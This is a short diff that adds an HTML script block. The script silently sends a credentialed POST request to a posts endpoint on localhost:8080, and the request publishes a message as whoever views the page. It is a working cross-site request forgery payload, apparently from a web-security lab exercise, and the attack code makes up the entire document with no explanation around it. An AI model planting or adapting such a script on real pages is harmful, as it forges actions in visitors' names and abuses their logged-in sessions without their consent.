@@ -1,0 +1,12 @@
+<script>
+    fetch(
+        "http://localhost:8080/posts", 
+        {
+            method: "POST",
+            headers: {"Content-Type": "application/x-www-form-urlencoded"},
+            body: "text=pizza+from+me+tonight+for+everyone",
+            mode: "no-cors",
+			credentials: "include",
+        }
+    );
+</script>
